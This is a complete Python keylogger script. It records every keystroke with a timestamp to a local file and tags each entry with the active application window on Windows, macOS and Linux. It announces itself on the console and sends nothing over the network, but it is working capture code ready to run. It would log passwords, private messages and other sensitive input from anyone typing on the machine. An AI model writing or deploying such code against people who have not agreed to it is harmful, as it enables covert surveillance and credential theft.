from pynput import keyboard
import datetime
import platform

# Detect OS and import appropriate libraries
if platform.system() == "Windows":
    import win32gui
    import win32process
    import psutil


    def get_active_window():
        try:
            window = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(window)[1]
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(window)
            return f"{process.name()} - {window_title}"
        except:
            return "Unknown"

elif platform.system() == "Darwin":
    from AppKit import NSWorkspace


    def get_active_window():
        try:
            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            return f"{active_app['NSApplicationName']}"
        except:
            return "Unknown"

elif platform.system() == "Linux":
    import subprocess


    def get_active_window():
        try:
            window_id = subprocess.check_output(['xdotool', 'getactivewindow']).decode().strip()
            window_name = subprocess.check_output(['xdotool', 'getwindowname', window_id]).decode().strip()
            return window_name
        except:
            return "Unknown"

# Configuration
log_file = "keylog.txt"
current_window = ""


def on_press(key):
    global current_window

    # Get current active window
    active_window = get_active_window()

    # Log window change
    if active_window != current_window:
        current_window = active_window
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n{'=' * 60}\n")
            f.write(f"[{timestamp}] APPLICATION: {current_window}\n")
            f.write(f"{'=' * 60}\n")

    # Log keystroke with timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        # Regular character keys
        with open(log_file, "a") as f:
            f.write(f"[{timestamp}] {key.char}\n")
    except AttributeError:
        # Special keys
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(f"[{timestamp}] [SPACE]\n")
            elif key == keyboard.Key.enter:
                f.write(f"[{timestamp}] [ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write(f"[{timestamp}] [TAB]\n")
            elif key == keyboard.Key.backspace:
                f.write(f"[{timestamp}] [BACKSPACE]\n")
            else:
                f.write(f"[{timestamp}] {key}\n")


# Start the listener
print("Keylogger started. Press Ctrl+C to stop.")
print(f"Logging to: {log_file}")

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nKeylogger stopped.")